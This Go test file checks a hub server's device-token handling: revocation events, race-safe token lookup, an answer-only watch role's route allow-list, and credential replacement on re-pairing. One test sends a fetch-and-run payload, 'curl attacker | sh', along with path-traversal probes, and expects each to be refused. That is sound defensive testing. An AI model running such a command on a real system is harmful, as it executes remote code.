package hub

import (
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/nwverse/persona/server/internal/bus"
	"github.com/nwverse/persona/server/internal/db"
	"github.com/nwverse/persona/server/internal/proto"
	"github.com/nwverse/persona/server/internal/screen"
)

// tokenStore keeps device tokens in memory, like the device_tokens table.
type tokenStore struct {
	memStore
	mu   sync.Mutex
	rows map[string]db.DeviceToken // hash -> token
	rev  map[string]bool
}

func (s *tokenStore) CreateDeviceToken(_ context.Context, t db.DeviceToken, hash string) error {
	s.mu.Lock()
	defer s.mu.Unlock()
	t.CreatedAt = time.Now()
	s.rows[hash] = t
	return nil
}

func (s *tokenStore) DeviceTokenByHash(_ context.Context, hash string) (*db.DeviceToken, error) {
	s.mu.Lock()
	defer s.mu.Unlock()
	t, ok := s.rows[hash]
	if !ok || s.rev[t.ID] || (t.ExpiresAt != nil && !time.Now().Before(*t.ExpiresAt)) {
		return nil, nil
	}
	return &t, nil
}

func (s *tokenStore) DeviceTokens(context.Context) ([]db.DeviceToken, error) {
	s.mu.Lock()
	defer s.mu.Unlock()
	var out []db.DeviceToken
	for _, t := range s.rows {
		out = append(out, t)
	}
	return out, nil
}

func (s *tokenStore) RevokeDeviceToken(_ context.Context, id string) (bool, error) {
	s.mu.Lock()
	defer s.mu.Unlock()
	for hash, t := range s.rows {
		if t.ID == id && !s.rev[id] {
			s.rev[id] = true
			now := time.Now()
			t.RevokedAt = &now
			s.rows[hash] = t
			return true, nil
		}
	}
	return false, nil
}

func (s *tokenStore) TouchDeviceToken(context.Context, string) error { return nil }

func TestDeviceRevocationReachesEveryManager(t *testing.T) {
	h := newTestHub(t)
	h.store = &tokenStore{rows: map[string]db.DeviceToken{
		"first": {ID: "dev_first"},
		"other": {ID: "dev_other"},
	}, rev: map[string]bool{}}
	h.bus.idents = &memIdents{}
	mux := http.NewServeMux()
	h.busRoutes(mux)
	h.tokenRoutes(mux)
	srv := httptest.NewServer(mux)
	t.Cleanup(srv.Close)
	events := make(chan bus.DeviceCredential, 2)
	for _, id := range []string{"assistant", "another-manager"} {
		m := connectGuardManager(t, h, srv.URL, id, func(string, json.RawMessage) (any, error) { return map[string]any{}, nil })
		m.mu.Lock()
		m.onEvent = func(event string, raw json.RawMessage) {
			if event == bus.EventCredentialRevoked {
				var p bus.DeviceCredential
				if err := json.Unmarshal(raw, &p); err != nil {
					t.Error(err)
				}
				events <- p
			}
		}
		m.mu.Unlock()
	}
	w := httptest.NewRecorder()
	mux.ServeHTTP(w, httptest.NewRequest(http.MethodDelete, "/api/v1/auth/tokens/dev_first", nil))
	if w.Code != http.StatusOK {
		t.Fatalf("sign out: %d %s", w.Code, w.Body)
	}
	for range 2 {
		select {
		case p := <-events:
			if p.ID != "dev_first" {
				t.Fatalf("revoked credential: %+v", p)
			}
		case <-time.After(5 * time.Second):
			t.Fatal("a manager missed the revocation event")
		}
	}

	// A fresh hub has no in-memory revocation and can still answer a manager that missed the event.
	fresh := newTestHub(t)
	fresh.store = h.store
	fresh.bus.idents = &memIdents{}
	freshMux := http.NewServeMux()
	fresh.busRoutes(freshMux)
	freshSrv := httptest.NewServer(freshMux)
	t.Cleanup(freshSrv.Close)
	m := connectGuardManager(t, fresh, freshSrv.URL, "assistant", func(string, json.RawMessage) (any, error) { return map[string]any{}, nil })
	for credential, want := range map[string]bool{"dev_first": true, "dev_other": false} {
		var status bus.CredentialStatus
		if err := m.call(t, bus.MethodCredentialRevoked, bus.DeviceCredential{ID: credential}, &status); err != nil || status.Revoked != want {
			t.Fatalf("status for %s: %+v, %v", credential, status, err)
		}
	}
}

// pausedTokenStore returns the snapshot read before revocation only after the test releases it.
type pausedTokenStore struct {
	*tokenStore
	read    chan struct{}
	release chan struct{}
}

func (s *pausedTokenStore) DeviceTokenByHash(ctx context.Context, hash string) (*db.DeviceToken, error) {
	dt, err := s.tokenStore.DeviceTokenByHash(ctx, hash)
	if dt != nil && err == nil {
		close(s.read)
		select {
		case <-s.release:
		case <-ctx.Done():
			return nil, ctx.Err()
		}
	}
	return dt, err
}

func TestDeviceTokenLookupConcurrentRevocation(t *testing.T) {
	for _, expired := range []bool{false, true} {
		name := "cold cache"
		if expired {
			name = "expired cache"
		}
		t.Run(name, func(t *testing.T) {
			h := newTestHub(t)
			const token, id = "jd_inflight", "dev_inflight"
			hash := hashToken(token)
			s := &pausedTokenStore{
				tokenStore: &tokenStore{memStore: *newMemStore(), rows: map[string]db.DeviceToken{
					hash: {ID: id, Name: "phone", Role: roleFull},
				}, rev: map[string]bool{}},
				read: make(chan struct{}), release: make(chan struct{}),
			}
			h.store = s
			if expired {
				h.devtok.cache = map[string]cachedToken{
					hash: {p: &principal{ID: id, Role: roleFull}, at: time.Now().Add(-2 * tokenCacheFor)},
				}
			}
			release := sync.OnceFunc(func() { close(s.release) })
			defer release()
			ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
			defer cancel()
			type result struct {
				p  principal
				ok bool
			}
			done := make(chan result, 1)
			go func() {
				p, ok := h.authenticate(ctx, token)
				done <- result{p, ok}
			}()
			select {
			case <-s.read:
			case <-ctx.Done():
				t.Fatal("lookup did not reach the snapshot barrier")
			}
			if ok, err := s.RevokeDeviceToken(ctx, id); err != nil || !ok {
				t.Fatalf("revoke: %v, %v", ok, err)
			}
			h.revoked(id)
			release()
			select {
			case got := <-done:
				if got.ok || got.p.ID != "" || got.p.Role != "" {
					t.Fatalf("stale lookup authenticated revoked device: %+v", got)
				}
			case <-ctx.Done():
				t.Fatal("lookup did not finish")
			}
			h.devtok.mu.Lock()
			_, cached := h.devtok.cache[hash]
			h.devtok.mu.Unlock()
			if cached {
				t.Fatal("stale lookup repopulated the cache after revocation")
			}
			if _, ok := h.authenticate(ctx, token); ok {
				t.Fatal("subsequent lookup authenticated revoked device")
			}
		})
	}
}

func TestDeviceRevocationRetention(t *testing.T) {
	h := newTestHub(t)
	h.devtok.revokedIDs = map[string]time.Time{
		"dev_old":    time.Now().Add(-2 * tokenRevokedFor),
		"dev_recent": time.Now().Add(-time.Minute),
	}
	if h.isDeviceRevoked("dev_old") || h.isDeviceRevoked("dev_unknown") || h.isDeviceRevoked("") {
		t.Fatal("expired, unknown or master credentials marked revoked")
	}
	h.revoked("dev_new")
	if !h.isDeviceRevoked("dev_new") || !h.isDeviceRevoked("dev_recent") {
		t.Fatal("recent revocations were not retained")
	}
	h.devtok.mu.Lock()
	_, retained := h.devtok.revokedIDs["dev_old"]
	h.devtok.mu.Unlock()
	if retained {
		t.Fatal("expired revocation was not pruned")
	}
}

func call(t *testing.T, h http.Handler, method, path, token, body string) (int, map[string]any) {
	t.Helper()
	req := httptest.NewRequest(method, path, strings.NewReader(body))
	req.RemoteAddr = "127.0.0.1:12345"
	req.Header.Set("Authorization", "Bearer "+token)
	w := httptest.NewRecorder()
	h.ServeHTTP(w, req)
	out := map[string]any{}
	_ = json.Unmarshal(w.Body.Bytes(), &out)
	return w.Code, out
}

func TestDeviceTokens(t *testing.T) {
	h := newTestHub(t)
	h.store = &tokenStore{memStore: *newMemStore(), rows: map[string]db.DeviceToken{}, rev: map[string]bool{}}
	h.builtinLooks = builtinPersonaFS() // the Milk Frog the watch fetches below
	mux := h.routes()
	master := h.cfg.Token

	code, phone := call(t, mux, "POST", "/api/v1/auth/tokens", master, `{"name":"iPhone","kind":"phone"}`)
	if code != 200 || phone["role"] != "full" || !strings.HasPrefix(phone["token"].(string), "jd_") {
		t.Fatalf("%d %v", code, phone)
	}
	phoneTok := phone["token"].(string)
	code, watch := call(t, mux, "POST", "/api/v1/auth/tokens", phoneTok, `{"name":"Watch","kind":"watch"}`)
	if code != 200 || watch["role"] != "answer" {
		t.Fatalf("the phone adds its watch: %d %v", code, watch)
	}
	watchTok := watch["token"].(string)

	// The watch reads and answers, nothing else; an answer goes to the manager, which has no such card.
	connectAssistant(t, h)
	if code, _ := call(t, mux, "GET", "/api/v1/interactions", watchTok, ""); code != 200 {
		t.Fatalf("watch read %d", code)
	}
	if code, _ := call(t, mux, "POST", "/api/v1/interactions/ix_x/resolve", watchTok, `{"allow":true}`); code != http.StatusGone {
		t.Fatalf("watch answer reaches the handler (410: no such card), got %d", code)
	}
	for _, p := range []string{"/api/v1/auth/tokens", "/api/v1/machines/m/reconnect", "/api/v1/sessions"} {
		if code, _ := call(t, mux, "POST", p, watchTok, `{}`); code != http.StatusForbidden {
			t.Fatalf("watch POST %s: %d", p, code)
		}
	}

	code, mine := call(t, mux, "GET", "/api/v1/auth/tokens", phoneTok, "")
	if code != 200 || mine["current"] != phone["id"] {
		t.Fatalf("%d %v", code, mine)
	}

	// Revoking the phone shuts it out at once; the pairing token and the watch keep working.
	if code, _ := call(t, mux, "DELETE", "/api/v1/auth/tokens/"+phone["id"].(string), master, ""); code != 200 {
		t.Fatal(code)
	}
	if code, _ := call(t, mux, "GET", "/api/v1/interactions", phoneTok, ""); code != http.StatusUnauthorized {
		t.Fatalf("revoked phone: %d", code)
	}
	if code, _ := call(t, mux, "GET", "/api/v1/interactions", watchTok, ""); code != 200 {
		t.Fatalf("watch after the phone's revocation: %d", code)
	}
	if code, _ := call(t, mux, "GET", "/api/v1/interactions", "jd_made_up", ""); code != http.StatusUnauthorized {
		t.Fatalf("unknown token: %d", code)
	}
	code, list := call(t, mux, "GET", "/api/v1/auth/tokens", master, "")
	if code != 200 || len(list["tokens"].([]any)) != 2 {
		t.Fatalf("%d %v", code, list)
	}
	for _, p := range []string{"/api/v1/ws", "/api/v1/auth/tokens", "/api/v1/machines/m/file", "/api/v1/personas/nwverse/persona.json"} {
		if code, _ := call(t, mux, "GET", p, watchTok, ""); code != http.StatusForbidden {
			t.Fatalf("watch GET %s: %d", p, code)
		}
	}
	// The Milk Frog's art reaches the watch through the whole chain, auth and the package's own file check (#4869).
	if code, pet := call(t, mux, "GET", "/api/v1/personas/nwverse/pet/pet.json", watchTok, ""); code != 200 || pet["clips"] == nil {
		t.Fatalf("watch GET the frog's manifest: %d %v", code, pet)
	}
}

// An answer-only device can do what the watch does and nothing else: whatever is not named is refused, a GET included.
func TestAnswerRoleOnlyWhatTheWatchDoes(t *testing.T) {
	p := principal{ID: "dev_watch", Role: roleAnswer}
	for _, c := range []struct {
		method, path string
		want         bool
	}{
		{"POST", "/api/v1/assistant/health/tell", true},
		{"GET", "/api/v1/assistant/health/tell", false},
		{"PUT", "/api/v1/assistant/health/tell", false},
		{"POST", "/api/v1/assistant/health/tell/x", false},
		{"POST", "/api/v1/assistant/health/workouts", false},
		{"POST", "/api/v1/assistant/conversations", false},
		{"GET", "/api/v1/machines", true},
		{"GET", "/api/v1/sessions", true},
		{"HEAD", "/api/v1/sessions", true},
		{"GET", "/api/v1/interactions", true},
		{"GET", "/api/v1/inbox", true},
		{"GET", "/api/v1/sessions/m/s/items", true},
		{"POST", "/api/v1/interactions/x/resolve", true},
		{"POST", "/api/v1/sessions/m/s/messages", true},
		{"POST", "/api/v1/sessions/m/s/seen", true},
		{"POST", "/api/v1/sessions/m/s/interrupt", true},
		{"POST", "/api/v1/inbox/x/done", true},
		{"POST", "/api/v1/inbox/x/draft", true},
		{"POST", "/api/v1/inbox/x/reply", true},
		{"POST", "/api/v1/inbox/x/suggestion", true}, // what it may do with it the manager checks
		// The Milk Frog's art for the watch's row and face (WatchPetPack.fetch), and nothing else of any package.
		{"GET", "/api/v1/personas/nwverse/pet/pet.json", true},
		{"GET", "/api/v1/personas/nwverse/pet/face-needs_you.png", true},
		{"GET", "/api/v1/personas/nwverse/pet/working.png", true},

		{"GET", "/api/v1/personas", false},
		{"GET", "/api/v1/personas/nwverse/persona.json", false},
		{"GET", "/api/v1/personas/nwverse/pet/", false},
		{"GET", "/api/v1/personas/nwverse/pet/..", false},
		{"GET", "/api/v1/personas/nwverse/pet/.hidden.png", false},
		{"GET", "/api/v1/personas/nwverse/pet/sub/x.png", false},
		{"GET", "/api/v1/personas/nwverse/pet/notes.txt", false},
		{"GET", "/api/v1/personas/u-0123abcd/pet/pet.json", false}, // an uploaded look
		{"GET", "/api/v1/personas/other/pet/pet.json", false},
		{"POST", "/api/v1/personas/nwverse/pet/pet.json", false},
		{"GET", "/api/v1/ws", false},
		{"GET", "/api/v1/machines/m/file", false},
		{"GET", "/api/v1/machines/m/file/download", false},
		{"GET", "/api/v1/machines/m/fs", false},
		{"GET", "/api/v1/machines/m/fs/find", false},
		{"GET", "/api/v1/machines/m/stat", false},
		{"GET", "/api/v1/machines/m/dirs", false},
		{"GET", "/api/v1/machines/m/git/status", false},
		{"GET", "/api/v1/machines/m/launchers", false},
		{"GET", "/api/v1/machines/m/launchers/x/models", false},
		{"GET", "/api/v1/machines/m/ports/8000/connect", false},
		{"GET", "/api/v1/sessions/m/s/screen", false},
		{"GET", "/api/v1/sessions/m/s/info", false},
		{"GET", "/api/v1/auth/tokens", false},
		{"GET", "/api/v1/devices/x/prefs", false},
		{"GET", "/api/v1/devices/x/sessions", false},
		{"GET", "/api/v1/inbox/x", false},
		{"GET", "/api/v1/inbox/done", false}, // the done items' history: the watch lists only the inbox
		{"GET", "/api/v1/inbox/done/days?tz=UTC", false},
		{"POST", "/api/v1/inbox/x/handoff", false}, // it writes in the main conversation
		{"GET", "/api/v1/inbox/mutes", false},
		{"GET", "/api/v1/plugins/x/y", false},
		{"GET", "/api/v1/sessions/m/s/items/x", false},
		{"GET", "/api/v1/machines/", false},

		{"POST", "/api/v1/devices", false},
		{"PUT", "/api/v1/devices/x/prefs", false},
		{"POST", "/api/v1/sessions", false},
		{"POST", "/api/v1/sessions/m/s/keys", false},
		{"POST", "/api/v1/sessions/m/s/attach", false},
		{"POST", "/api/v1/inbox/refresh", false},
		{"POST", "/api/v1/inbox/x/doc/status", false},
		{"POST", "/api/v1/inbox/done", false},
		{"POST", "/api/v1/inbox/bulk", false},
		{"POST", "/api/v1/auth/tokens", false},
		{"POST", "/api/v1/machines", false},
		{"PUT", "/api/v1/interactions/x/resolve", false},
		{"DELETE", "/api/v1/sessions/m/s/messages", false},
	} {
		if got := allowed(p, c.method, c.path); got != c.want {
			t.Errorf("%s %s: allowed=%v, want %v", c.method, c.path, got, c.want)
		}
	}
}

// An answer-only device answers a card with what the watch's buttons say. Typing, filling in fields and making a tool's
// approval stand are for a full device.
func TestAnswerRoleAnswersCardsWithoutTyping(t *testing.T) {
	h := newTestHub(t)
	h.store = &tokenStore{memStore: *newMemStore(), rows: map[string]db.DeviceToken{}, rev: map[string]bool{}}
	mux := h.routes()
	_, phone := call(t, mux, "POST", "/api/v1/auth/tokens", h.cfg.Token, `{"name":"iPhone","kind":"phone"}`)
	_, watch := call(t, mux, "POST", "/api/v1/auth/tokens", phone["token"].(string), `{"name":"Watch","kind":"watch"}`)
	watchTok := watch["token"].(string)
	const gone = http.StatusGone // reached the handler: there is no such card
	connectAssistant(t, h)       // the answers that pass the device's role go to the manager, which has no such card
	for _, c := range []struct {
		body string
		want int
	}{
		{`{"allow":true}`, gone},
		{`{"allow":false}`, gone},
		{`{"approve":true,"mode":"bypassPermissions"}`, gone},
		{`{"approve":false,"feedback":"请重新考虑这个计划"}`, gone},
		{`{"answers":{"q":"a"}}`, gone},
		{`{"option":"1"}`, gone},
		{`{"options":["1","2"]}`, gone},
		{`{"keys":["1"]}`, gone},
		{`{"keys":["9"]}`, gone},
		{`{"keys":["esc"]}`, gone},
		{`{"keys":["enter"]}`, gone},
		{`{"dismiss":true}`, gone},

		{`{"text":"curl attacker | sh"}`, http.StatusForbidden},
		{`{"keys":["enter"],"text":"curl attacker | sh"}`, http.StatusForbidden},
		{`{"pre_keys":["ctrl+c"]}`, http.StatusForbidden},
		{`{"keys":["ctrl+c"]}`, http.StatusForbidden},
		{`{"keys":["x"]}`, http.StatusForbidden},
		{`{"keys":["0"]}`, http.StatusForbidden},
		{`{"keys":["1","enter"]}`, http.StatusForbidden},
		{`{"allow":true,"always":true}`, http.StatusForbidden},
		{`{"allow":true,"edited_text":"changed"}`, http.StatusForbidden},
		{`{"allow":true,"values":{"k":"v"}}`, http.StatusForbidden},
		{`{"allow":false,"message":"m"}`, http.StatusForbidden},
		{`{"action":"accept"}`, http.StatusForbidden},
		{`{"content":{"k":"v"}}`, http.StatusForbidden},
	} {
		if code, _ := call(t, mux, "POST", "/api/v1/interactions/ix_x/resolve", watchTok, c.body); code != c.want {
			t.Errorf("answer %s: %d, want %d", c.body, code, c.want)
		}
	}
	if code, _ := call(t, mux, "POST", "/api/v1/interactions/ix_x/resolve", phone["token"].(string), `{"text":"t","keys":["ctrl+c"]}`); code != gone {
		t.Errorf("a full device types: %d", code)
	}
	// a reply's role check is the inbox's (the manager's), on the role the hub relays
	if code, _ := call(t, mux, "POST", "/api/v1/inbox/ix_x/reply", watchTok, `{"text":"t","changes":[{"status":"x"}]}`); code != http.StatusForbidden {
		t.Errorf("an answer-only device moves a document's status: %d", code)
	}
	if code, _ := call(t, mux, "POST", "/api/v1/inbox/ix_x/reply", watchTok, `{"text":"t"}`); code == http.StatusForbidden {
		t.Errorf("an answer-only device replies: %d", code)
	}
	// A reply posted as the user may come back as their request to start an agent (a plugin's /agent).
	for _, text := range []string{"/agent do it", "  /agent"} {
		body, _ := json.Marshal(map[string]string{"text": text})
		if code, _ := call(t, mux, "POST", "/api/v1/inbox/ix_x/reply", watchTok, string(body)); code != http.StatusForbidden {
			t.Errorf("an answer-only device replies %q: %d", text, code)
		}
	}
	for _, c := range []struct{ tok, text string }{{watchTok, "/agents are fine"}, {phone["token"].(string), "/agent do it"}} {
		body, _ := json.Marshal(map[string]string{"text": c.text})
		if code, _ := call(t, mux, "POST", "/api/v1/inbox/ix_x/reply", c.tok, string(body)); code == http.StatusForbidden {
			t.Errorf("reply %q: %d", c.text, code)
		}
	}
}

// An answer-only device brings no text, so it may not pick a screen card's free-text field: the node would open it and
// press enter on nothing (#1185). Refused before the card is claimed, so the card stays for the phone; its own
// choices still go through.
func TestAnswerRoleCannotPickTheFreeTextField(t *testing.T) {
	h := newTestHub(t)
	h.store = &tokenStore{memStore: *newMemStore(), rows: map[string]db.DeviceToken{}, rev: map[string]bool{}}
	mux := h.routes()
	_, phone := call(t, mux, "POST", "/api/v1/auth/tokens", h.cfg.Token, `{"name":"iPhone","kind":"phone"}`)
	_, watch := call(t, mux, "POST", "/api/v1/auth/tokens", phone["token"].(string), `{"name":"Watch","kind":"watch"}`)
	watchTok := watch["token"].(string)
	// The cards are the manager's (fleet.interaction); the hub holds an answer-only device to a card's own choices
	// before it relays the answer to the manager (here none is connected: 503 assistant_offline, nothing claimed).
	card := func(id string, multi bool) {
		d := &screen.Dialog{Rev: "r1", Multi: multi, Options: []screen.Option{
			{Key: "1", Label: "Yes", Keys: []string{"1"}},
			{Key: "2", Label: "Type something.", Kind: screen.KindTypeSomething, Keys: []string{"2"}},
			{Key: "3", Label: "Chat about this", Kind: screen.KindChat, Keys: []string{"3"}},
		}}
		reportInteraction(t, h, proto.Interaction{ID: id, MachineID: "box", SessionID: "s1", Kind: proto.IxScreen, Dialog: d})
	}
	stillPending := func(id string) bool {
		_, ok := h.pendingInteraction(id)
		return ok
	}
	relayed := func(code int, body map[string]any) bool {
		return code == http.StatusServiceUnavailable && body["code"] == "assistant_offline"
	}
	card("ix_one", false)
	card("ix_many", true)
	for _, c := range []struct{ id, body string }{
		{"ix_one", `{"option":"2"}`},
		{"ix_many", `{"options":["1","2"]}`},
		{"ix_many", `{"option":"2"}`},
	} {
		if code, _ := call(t, mux, "POST", "/api/v1/interactions/"+c.id+"/resolve", watchTok, c.body); code != http.StatusForbidden {
			t.Errorf("answer %s to %s: %d, want 403", c.body, c.id, code)
		}
		if !stillPending(c.id) {
			t.Errorf("%s was claimed by a refused answer", c.id)
		}
	}
	if code, body := call(t, mux, "POST", "/api/v1/interactions/ix_one/resolve", watchTok, `{"option":"1"}`); !relayed(code, body) {
		t.Fatalf("the card's own choice: %d %v", code, body)
	}
	if code, body := call(t, mux, "POST", "/api/v1/interactions/ix_many/resolve", watchTok, `{"option":"3"}`); !relayed(code, body) {
		t.Fatalf("Chat about this: %d %v", code, body)
	}
	card("ix_phone", false)
	if code, body := call(t, mux, "POST", "/api/v1/interactions/ix_phone/resolve", phone["token"].(string), `{"option":"2","text":"用另一种做法"}`); !relayed(code, body) {
		t.Errorf("a full device writes its own answer: %d", code)
	}
}

// A browser signing in again names its earlier credential and the hub takes that one off, so the browser stays one
// device; an id that is not a web credential (a phone's) is left alone, and an old client without "replaces" still
// just gets a new one.
func TestWebSignInReplacesItsEarlierDevice(t *testing.T) {
	h := newTestHub(t)
	h.store = &tokenStore{memStore: *newMemStore(), rows: map[string]db.DeviceToken{}, rev: map[string]bool{}}
	mux := h.routes()
	master := h.cfg.Token

	_, phone := call(t, mux, "POST", "/api/v1/auth/tokens", master, `{"name":"iPhone","kind":"phone"}`)
	code, first := call(t, mux, "POST", "/api/v1/auth/tokens", master, `{"name":"网页（Chrome · Mac · 11月6日）","kind":"web"}`)
	if code != 200 || first["replaced"] != nil {
		t.Fatalf("first sign-in: %d %v", code, first)
	}
	firstTok := first["token"].(string)

	code, second := call(t, mux, "POST", "/api/v1/auth/tokens", master,
		`{"name":"网页（Chrome · Mac · 11月6日）","kind":"web","replaces":"`+first["id"].(string)+`"}`)
	if code != 200 || second["replaced"] != first["id"] || second["id"] == first["id"] {
		t.Fatalf("signing in again: %d %v", code, second)
	}
	if code, _ := call(t, mux, "GET", "/api/v1/interactions", firstTok, ""); code != http.StatusUnauthorized {
		t.Fatalf("the replaced credential still works: %d", code)
	}
	if code, _ := call(t, mux, "GET", "/api/v1/machines", second["token"].(string), ""); code != 200 {
		t.Fatalf("the new credential: %d", code)
	}

	// A phone's id is not the browser's to take off.
	code, third := call(t, mux, "POST", "/api/v1/auth/tokens", master, `{"name":"网页","kind":"web","replaces":"`+phone["id"].(string)+`"}`)
	if code != 200 || third["replaced"] != nil {
		t.Fatalf("replacing a phone: %d %v", code, third)
	}
	if code, _ := call(t, mux, "GET", "/api/v1/machines", phone["token"].(string), ""); code != 200 {
		t.Fatalf("the phone was taken off: %d", code)
	}

	code, list := call(t, mux, "GET", "/api/v1/auth/tokens", master, "")
	kinds := map[string]int{}
	for _, it := range list["tokens"].([]any) {
		kinds[it.(map[string]any)["kind"].(string)]++
	}
	if code != 200 || kinds["web"] != 3 || kinds["phone"] != 1 {
		t.Fatalf("kinds %v", kinds)
	}
}

func TestSameKindReplacesAndLinkDedupAndOnlineCredentials(t *testing.T) {
	h := newTestHub(t)
	h.cfg.Machines = []MachineConfig{
		{ID: "mac-a", Name: "Mac A", Kind: kindLink},
		{ID: "mac-b", Name: "Mac B", Kind: kindLink},
	}
	h.store = &tokenStore{memStore: *newMemStore(), rows: map[string]db.DeviceToken{}, rev: map[string]bool{}}
	mux := h.routes()
	master := h.cfg.Token

	// Phone replaces phone, watch replaces watch, cross-kind is ignored.
	code, phone1 := call(t, mux, "POST", "/api/v1/auth/tokens", master, `{"name":"Phone","kind":"phone"}`)
	if code != 200 {
		t.Fatalf("phone1: %d %v", code, phone1)
	}
	code, watch1 := call(t, mux, "POST", "/api/v1/auth/tokens", master, `{"name":"Watch","kind":"watch"}`)
	if code != 200 {
		t.Fatalf("watch1: %d %v", code, watch1)
	}
	code, phone2 := call(t, mux, "POST", "/api/v1/auth/tokens", master,
		`{"name":"Phone","kind":"phone","replaces":"`+phone1["id"].(string)+`"}`)
	if code != 200 || phone2["replaced"] != phone1["id"] {
		t.Fatalf("phone2 replace: %d %v", code, phone2)
	}
	if code, _ := call(t, mux, "GET", "/api/v1/machines", phone1["token"].(string), ""); code != http.StatusUnauthorized {
		t.Fatalf("replaced phone1 still works: %d", code)
	}
	code, watch2 := call(t, mux, "POST", "/api/v1/auth/tokens", master,
		`{"name":"Watch","kind":"watch","replaces":"`+watch1["id"].(string)+`"}`)
	if code != 200 || watch2["replaced"] != watch1["id"] {
		t.Fatalf("watch2 replace: %d %v", code, watch2)
	}
	if code, _ := call(t, mux, "GET", "/api/v1/machines", watch1["token"].(string), ""); code != http.StatusUnauthorized {
		t.Fatalf("replaced watch1 still works: %d", code)
	}
	// Phone cannot replace watch.
	code, phone3 := call(t, mux, "POST", "/api/v1/auth/tokens", master,
		`{"name":"Phone","kind":"phone","replaces":"`+watch2["id"].(string)+`"}`)
	if code != 200 || phone3["replaced"] != nil {
		t.Fatalf("cross-kind replace should be ignored: %d %v", code, phone3)
	}
	if code, _ := call(t, mux, "GET", "/api/v1/machines", watch2["token"].(string), ""); code != 200 {
		t.Fatalf("watch2 should remain valid: %d", code)
	}

	// Re-pairing a Persona Link computer revokes the earlier active link token for the same machine only.
	code, linkA1 := call(t, mux, "POST", "/api/v1/auth/tokens", master, `{"kind":"link","machine":"mac-a"}`)
	if code != 200 {
		t.Fatalf("linkA1: %d %v", code, linkA1)
	}
	code, linkB1 := call(t, mux, "POST", "/api/v1/auth/tokens", master, `{"kind":"link","machine":"mac-b"}`)
	if code != 200 {
		t.Fatalf("linkB1: %d %v", code, linkB1)
	}
	code, linkA2 := call(t, mux, "POST", "/api/v1/auth/tokens", master, `{"kind":"link","machine":"mac-a"}`)
	if code != 200 {
		t.Fatalf("linkA2: %d %v", code, linkA2)
	}
	if _, ok := h.authenticate(context.Background(), linkA1["token"].(string)); ok {
		t.Fatal("superseded linkA1 token still authenticates")
	}
	if _, ok := h.authenticate(context.Background(), linkA2["token"].(string)); !ok {
		t.Fatal("new linkA2 token should authenticate")
	}
	if _, ok := h.authenticate(context.Background(), linkB1["token"].(string)); !ok {
		t.Fatal("unrelated machine linkB1 token should stay valid")
	}

	// GET /api/v1/auth/tokens reports active client WebSockets and Persona Links in "online".
	wsClient := &client{device: phone2["id"].(string)}
	rl := &relayLink{tokenID: linkA2["id"].(string)}
	h.mu.Lock()
	if h.clients == nil {
		h.clients = map[*client]struct{}{}
	}
	h.clients[wsClient] = struct{}{}
	h.mu.Unlock()
	h.relay.mu.Lock()
	if h.relay.links == nil {
		h.relay.links = map[*relayLink]struct{}{}
	}
	h.relay.links[rl] = struct{}{}
	h.relay.mu.Unlock()
	t.Cleanup(func() {
		h.mu.Lock()
		delete(h.clients, wsClient)
		h.mu.Unlock()
		h.relay.mu.Lock()
		delete(h.relay.links, rl)
		h.relay.mu.Unlock()
	})

	code, listed := call(t, mux, "GET", "/api/v1/auth/tokens", master, "")
	if code != 200 {
		t.Fatalf("list tokens: %d %v", code, listed)
	}
	rawOnline, ok := listed["online"].([]any)
	if !ok {
		t.Fatalf("expected online array in response: %v", listed)
	}
	gotOnline := map[string]bool{}
	for _, v := range rawOnline {
		gotOnline[v.(string)] = true
	}
	if !gotOnline[phone2["id"].(string)] || !gotOnline[linkA2["id"].(string)] || gotOnline[linkB1["id"].(string)] {
		t.Fatalf("unexpected online credentials: %v", rawOnline)
	}
}

func TestLinkDedupSkipsWhileLinkSwitchUnderWay(t *testing.T) {
	h := newTestHub(t)
	h.cfg.Machines = []MachineConfig{
		{ID: "mac-b", Name: "Mac B", Kind: kindLink},
	}
	h.store = &tokenStore{memStore: *newMemStore(), rows: map[string]db.DeviceToken{}, rev: map[string]bool{}}
	mux := h.routes()
	master := h.cfg.Token

	if err := h.linkSwitch.claim("mac-b", &linkSwitchRun{operation: "op-1", until: time.Now().Add(time.Minute)}, time.Now()); err != nil {
		t.Fatalf("claim link switch: %v", err)
	}
	code, link1 := call(t, mux, "POST", "/api/v1/auth/tokens", master, `{"kind":"link","machine":"mac-b"}`)
	if code != 200 {
		t.Fatalf("link1: %d %v", code, link1)
	}
	code, link2 := call(t, mux, "POST", "/api/v1/auth/tokens", master, `{"kind":"link","machine":"mac-b"}`)
	if code != 200 {
		t.Fatalf("link2: %d %v", code, link2)
	}
	if _, ok := h.authenticate(context.Background(), link1["token"].(string)); !ok {
		t.Fatal("link1 should remain valid while link switch is under way")
	}
	if _, ok := h.authenticate(context.Background(), link2["token"].(string)); !ok {
		t.Fatal("link2 should authenticate while link switch is under way")
	}

	h.linkSwitch.drop("mac-b", "op-1")
	code, link3 := call(t, mux, "POST", "/api/v1/auth/tokens", master, `{"kind":"link","machine":"mac-b"}`)
	if code != 200 {
		t.Fatalf("link3: %d %v", code, link3)
	}
	if _, ok := h.authenticate(context.Background(), link1["token"].(string)); ok {
		t.Fatal("link1 should be revoked after link switch finishes")
	}
	if _, ok := h.authenticate(context.Background(), link2["token"].(string)); ok {
		t.Fatal("link2 should be revoked after link switch finishes")
	}
	if _, ok := h.authenticate(context.Background(), link3["token"].(string)); !ok {
		t.Fatal("link3 should authenticate")
	}
}
